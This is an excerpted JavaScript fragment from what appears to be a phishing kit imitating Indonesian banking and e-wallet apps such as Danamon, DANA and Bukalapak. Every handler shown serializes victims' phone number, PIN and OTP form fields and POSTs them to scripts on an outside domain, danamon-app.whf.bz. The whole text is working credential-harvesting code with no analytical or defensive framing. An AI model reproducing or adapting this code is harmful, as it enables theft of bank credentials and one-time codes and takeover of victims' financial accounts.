...
/////
   function sendNohp(event){
    ...
    var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
			$.ajax( {
			  type: 'POST',
			  url: 'https://danamon-app.whf.bz/token/dana19/one.php',
			  data: dataString,
...
function sendPin(){
  ...
  var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
			$.ajax( {
			  type: 'POST',
			  url: 'https://danamon-app.whf.bz/token/dana19/two.php',
			  data: dataString,
...
$(".alert").css("color","red");
    ...
    var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
			$.ajax( {
			  type: 'POST',
			  url: 'https://danamon-app.whf.bz/token/dana19/tree.php',
			  data: dataString,
...
function bukalapak(event){
    ...
    event.preventDefault();
          ...
          var dataString = $("#formNohp, #formPin, #formBuka, #formOtp").serialize();
			$.ajax({
			  type: 'POST',
			  url: 'https://danamon-app.whf.bz/token/dana19/four.php',
			  data: dataString,
